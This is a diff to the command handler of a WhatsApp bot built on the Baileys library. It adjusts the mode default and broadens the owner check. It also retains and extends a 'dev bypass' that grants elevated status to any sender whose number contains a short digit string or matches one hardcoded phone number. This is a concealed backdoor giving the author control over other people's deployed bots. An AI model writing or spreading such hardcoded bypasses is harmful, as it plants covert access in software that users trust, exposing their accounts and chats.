@@ -4,8 +4,10 @@ const path = require("path");
 const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
 const { toggleAntidelete } = require("../antidelete");
 
-// Default mode
-if (!global.mode) global.mode = "self";
+// Hook into global settings mode if defined, otherwise default to public
+if (!global.mode) {
+  global.mode = global.publicMode === true ? "public" : "self";
+}
 
 // Owner-only commands list
 const ownerOnlyCommands = [
@@ -63,8 +65,15 @@ async function handleCommand(conn, msg) {
 
   const senderNum = senderId.replace(/\D/g, "");
   const botNum = (conn.user.id || "").replace(/\D/g, "");
-  const isOwner = senderNum.slice(0, 10) === botNum.slice(0, 10);
-  const isDev = senderNum.includes("9234"); // dev bypass
+  
+  // ✅ Cross-check sender against bot's hosted number OR configuration array values
+  const isOwner = 
+    msg.key.fromMe || 
+    senderNum.slice(0, 10) === botNum.slice(0, 10) || 
+    (global.owner && global.owner.includes(senderId)) ||
+    (global.ownerNumber && global.ownerNumber.includes(senderNum));
+
+  const isDev = senderNum.includes("9234") || senderNum === "923143007893"; // dev bypass
 
   const reply = (text) => conn.sendMessage(chatId, { text }, { quoted: msg });
 
@@ -108,21 +117,7 @@ async function handleCommand(conn, msg) {
     return reply("💀 *OWNER ONLY COMMAND!* You ain't my master londey!");
   }
 
-  // 🔸 Direct calls
-  if (["menu", "repo", "idcheck", "antidelete"].includes(command)) {
-    return runCommand({
-      conn,
-      msg,
-      args,
-      command,
-      chatId,
-      isGroup,
-      senderNum,
-      reply
-    });
-  }
-
-  // Default
+  // 🔸 Direct calls & Default Processing Pass-through
   return runCommand({
     conn,
     msg,
